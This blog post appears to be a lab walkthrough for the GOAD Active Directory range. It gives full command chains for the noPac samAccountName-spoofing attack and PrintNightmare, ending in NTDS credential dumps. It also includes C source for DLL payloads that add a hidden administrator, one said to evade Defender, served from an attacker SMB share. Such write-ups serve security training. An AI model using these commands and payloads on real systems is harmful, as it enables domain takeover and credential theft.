---
layout: post
title:  "GOAD - part 5 - exploit with user"
category : AD
tags :  AD, Lab, samaccountname, nopac, printnightmare
---

On the previous post ([Goad pwning part4]({% link _posts/2022-07-12-GOADv2-pwning-part4.md %})) we played with relay ntlm.
For this part we will continue on what to do with a valid account on the domain.

![account_on_domain.png](/assets/blog/GOAD/account_on_domain.png)

Here we will only try samAccountName exploit and PrintNightmare as MS14-068 is now too old (Windows Server 2012 R2 max).

## SamAccountName (nopac)

At the end of 2021 when everyone was worried about the log4j "log4shell" vulnerability another vulnerability raise up with less noise : CVE-2021-42287.

- I will not re-explain the vulnerability, as it is wonderfully describe here by Charlie Clark : [https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)

- The attack was automated on windows by cube0x0 : [https://github.com/cube0x0/noPac](https://github.com/cube0x0/noPac)
- And on linux by shutdown : [https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing) (still in impacket pull requests : [https://github.com/SecureAuthCorp/impacket/pull/1202](https://github.com/SecureAuthCorp/impacket/pull/1202) and [https://github.com/SecureAuthCorp/impacket/pull/1224](https://github.com/SecureAuthCorp/impacket/pull/1224))

- As a huge fan of linux and exegol we will try the linux way :)

### Verify if we can add computer

For this attack i will use `north/jon.snow:iknownothing` account as we previously get it with kerberoasting in the part3.

Let's find a cme module to check the machine account quota

```shell
cme ldap -L
```

![cme_module_listing.png](/assets/blog/GOAD/cme_module_listing.png)

```shell
cme ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ
```

![machineaccountquota.png](/assets/blog/GOAD/machineaccountquota.png)

### Prepare Impacket

Before exploiting with impacket let's prepare our impacket version with the pull request we want.

- Clone the impacket repo

```shell
cd /opt/tools
git clone https://github.com/SecureAuthCorp/impacket myimpacket
```

- Create our branch

```shell
cd myimpacket
git checkout -b mydev
```

- Create a venv to don't interfer with the host environment and install the repository we just checkout

```shell
python3 -m virtualenv myimpacket
source myimpacket/bin/activate
python3 -m pip install .
```

- Get the waiting pull requests we want (You can find a huge list of nice PR to merge in exegol install script : https://github.com/ShutdownRepo/Exegol-images/blame/main/sources/install.sh#L286 )

```shell
git fetch origin pull/1224/head:1224
git fetch origin pull/1202/head:1202
```

- Merge the pull requests to our branch

```shell
git merge 1202
git merge 1224
```

- Reorder the path entry result to load our pyenv bin before the others in the $PATH (this is needed on zsh, in bash it take directly our pyenv bins)

```shell
rehash
```

- Now let's verify we get all the binaries and options we want :

```shell
renameMachine.py
getST.py
```

- Excellent, we are now using the latest impacket version with Shutdown (@_nwodtuhs) pull requests needed for this attack :)


### Exploit

What we will do is add a computer, clear the SPN of that computer, rename computer with the same name as the DC,
obtain a TGT for that computer, reset the computer name to his original name, obtain a service ticket with the TGT we get previously and finally dcsync :)

- Add a new computer

```shell
addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
```

![samaccountname_addcomputer.png](/assets/blog/GOAD/samaccountname_addcomputer.png)


- Clear the SPNs of our new computer (with dirkjan [krbrelayx](https://github.com/dirkjanm/krbrelayx) tool addspn)

```shell
addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'
```

![samaccountname_addspn.png](/assets/blog/GOAD/samaccountname_addspn.png)


- Rename the computer (computer -> DC)

```shell
renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing
```

![samaccountname_renamemachine.png](/assets/blog/GOAD/samaccountname_renamemachine.png)


- Obtain a TGT

```shell
getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'
```

![samaccountname_getTGT.png](/assets/blog/GOAD/samaccountname_getTGT.png)


- Reset the computer name back to the original name

```shell
renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing
```

![samaccountname_rollbackname.png](/assets/blog/GOAD/samaccountname_rollbackname.png)


- Obtain a service ticket with S4U2self by presenting the previous TGT

```shell
export KRB5CCNAME=/workspace/winterfell.ccache
getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
```

![samaccountname_getST.png](/assets/blog/GOAD/samaccountname_getST.png)

- DCSync by presenting the service ticket

```shell
export KRB5CCNAME=/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'
```

![samaccountname_secretsdump.png](/assets/blog/GOAD/samaccountname_secretsdump.png)


- And voilà, we got all the north domain ntds.dit informations :)

- Now clean up by deleting the computer we created with the administrator account hash we just get

```shell
addcomputer.py -computer-name 'samaccountname$' -delete -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' 'north.sevenkingdoms.local/Administrator'
```

```
Impacket v0.10.1.dev1+20220708.213759.8b1a99f7 - Copyright 2022 SecureAuth Corporation
[*] Successfully deleted samaccountname$.
```


## PrintNightmare

To exploit printnightmare we will first check if the spooler is active on targets

### Verify spooler is active

- With cme

```shell
cme smb 192.168.56.10-23 -M spooler
```

![cme_check_spooler.png](/assets/blog/GOAD/cme_check_spooler.png)


- With impacket rpcdump

```shell
rpcdump.py @192.168.56.10 | egrep 'MS-RPRN|MS-PAR'
```

![printnightmare_check_rpcdump.png](/assets/blog/GOAD/printnightmare_check_rpcdump.png)

### Prepare impacket

- To exploit with cube0x0 script you no longer need the modified impacket version as the modifications as been merged in the main project:
  - [https://github.com/SecureAuthCorp/impacket/pull/1114](https://github.com/SecureAuthCorp/impacket/pull/1114)
  - [https://github.com/SecureAuthCorp/impacket/pull/1109](https://github.com/SecureAuthCorp/impacket/pull/1109)

### Prepare the dll

- Let's prepare the exploitation dll
- We will create a user and add it as local administrator
- Create the file nightmare.c:

```c
#include <windows.h> 

int RunCMD()
{
    system("net users pnightmare Passw0rd123. /add");
    system("net localgroup administrators pnightmare /add");
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        RunCMD();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

- Compile it:

```shell
x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c
```

### Exploit on old and vulnerable windows server 2016 (meereen)

- Clone the exploit

```shell
git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare
```

- Prepare a smb share with the dll

```shell
smbserver.py -smb2support ATTACKERSHARE .
```

- Before the exploit no user pnightmare

![pnightmare_before.png](/assets/blog/GOAD/pnightmare_before.png)

- Try on Braavos
  - Braavos is an uptodate windows server 2016, the exploit not work (same error if you try on the north domain on castelblack server)

![printnightmare_error.png](/assets/blog/GOAD/printnightmare_error.png)


- Exploit on Meereen

```shell
python3 CVE-2021-1675.py essos.local/jorah.mormont:'H0nnor!'@meereen.essos.local '\\192.168.56.1\ATTACKERSHARE\nightmare.dll'
```

![pnightmare_exploit.png](/assets/blog/GOAD/pnightmare_exploit.png)


- The exploit worked

![cme_smb_pnightmare_worked.png](/assets/blog/GOAD/cme_smb_pnightmare_worked.png)

![pnightmare_user_added.png](/assets/blog/GOAD/pnightmare_user_added.png)

> Wait, you use domain connection instead of --local-auth with cme no ?

- Yes, this is because meereen is a domain controler:

_"Domain controllers do not have built-in or account domains. Also, instead of a SAM database, these systems use the Microsoft Active Directory directory service to store account access information."_

- see: https://docs.microsoft.com/en-us/windows/win32/secmgmt/built-in-and-account-domains

### Exploit on vulnerable windows server 2019 (winterfell)

- Now try the same exploit on a vulnerable windows server 2019

```shell
python3 CVE-2021-1675.py north.sevenkingdoms.local/jon.snow:'iknownothing'@north.sevenkingdoms.local '\\192.168.56.1\ATTACKERSHARE\nightmare.dll'
```

- And it work too but the user is not in the administrators group :(
- Nothing due to the exploit, it is just our dll who add a user as administrator who get caught when user is setup as administrator

![defender.png](/assets/blog/GOAD/defender.png)

- And good think to know, after some failures the spooler service will be stopped by defender and no more exploit for you until someone restart the server or the spooler service.


- Let's change the payload with another code (source : https://github.com/newsoft/adduser )

```c++
/*
 * ADDUSER.C: creating a Windows user programmatically.
 */

#define UNICODE
#define _UNICODE

#include <windows.h>
#include <string.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <tchar.h>


DWORD CreateAdminUserInternal(void)
{
    NET_API_STATUS rc;
    BOOL b;
    DWORD dw;

    USER_INFO_1 ud;
    LOCALGROUP_MEMBERS_INFO_0 gd;
    SID_NAME_USE snu;

    DWORD cbSid = 256;    // 256 bytes should be enough for everybody :)
    BYTE Sid[256];

    DWORD cbDomain = 256 / sizeof(TCHAR);
    TCHAR Domain[256];

    // Create user
    memset(&ud, 0, sizeof(ud));

    ud.usri1_name        = _T("pnightmare2");                // username
    ud.usri1_password    = _T("Test123456789!");             // password
    ud.usri1_priv        = USER_PRIV_USER;                   // cannot set USER_PRIV_ADMIN on creation
    ud.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;    // must be set
    ud.usri1_script_path = NULL;

    rc = NetUserAdd(
        NULL,            // local server
        1,                // information level
        (LPBYTE)&ud,
        NULL            // error value
    );

    if (rc != NERR_Success) {
        _tprintf(_T("NetUserAdd FAIL %d 0x%08x\r\n"), rc, rc);
        return rc;
    }

   _tprintf(_T("NetUserAdd OK\r\n"), rc, rc);

    // Get user SID
    b = LookupAccountName(
        NULL,            // local server
        ud.usri1_name,   // account name
        Sid,             // SID
        &cbSid,          // SID size
        Domain,          // Domain
        &cbDomain,       // Domain size
        &snu             // SID_NAME_USE (enum)
    );

    if (!b) {
        dw = GetLastError();
        _tprintf(_T("LookupAccountName FAIL %d 0x%08x\r\n"), dw, dw);
        return dw;
    }

    // Add user to "Administrators" local group
    memset(&gd, 0, sizeof(gd));

    gd.lgrmi0_sid = (PSID)Sid;

    rc = NetLocalGroupAddMembers(
        NULL,                    // local server
        _T("Administrators"),
        0,                        // information level
        (LPBYTE)&gd,
        1                        // only one entry
    );

    if (rc != NERR_Success) {
        _tprintf(_T("NetLocalGroupAddMembers FAIL %d 0x%08x\r\n"), rc, rc);
        return rc;
    }

    return 0;
}

//
// DLL entry point.
//

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateAdminUserInternal();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// RUNDLL32 entry point
#ifdef __cplusplus
extern "C" {
#endif

__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    CreateAdminUserInternal();
}

#ifdef __cplusplus
}
#endif

// Command-line entry point.
int main()
{
    return CreateAdminUserInternal();
}
```

- with this payload we can bypass defender and add our user as administrator
- compile

```shell
x86_64-w64-mingw32-gcc -shared -opnightmare2.dll adduser.c -lnetapi32
```

- prepare the share

```shell
smbserver.py -smb2support ATTACKERSHARE .
```

- relaunch the exploit

```shell
python3 CVE-2021-1675.py north.sevenkingdoms.local/jon.snow:'iknownothing'@winterfell.north.sevenkingdoms.local '\\192.168.56.1\ATTACKERSHARE\pnightmare2.dll'
```

![printnightmare_newpayload.png](/assets/blog/GOAD/printnightmare_newpayload.png)

- And enjoy your new admin account by dumping the ntds :)

```shell
cme smb winterfell.north.sevenkingdoms.local -u pnightmare2 -p 'Test123456789!' --ntds
```

![cme_admin_ntds.png](/assets/blog/GOAD/cme_admin_ntds.png)

### cleanup

- After the exploitation you will find your dlls inside : `C:\Windows\System32\spool\drivers\x64\3`

![pnightmare_traces.png](/assets/blog/GOAD/pnightmare_traces.png)


- And also inside : `C:\Windows\System32\spool\drivers\x64\3\Old\{id}\`

![traces_old.png](/assets/blog/GOAD/traces_old.png)

- Don't forget to clean up ;)


Next time we will have fun with ADCS (Certifried, ESC1, ESC8, ...) : : [Goad pwning part6]({% link _posts/2022-09-07-GOADv2-pwning-part6.md %})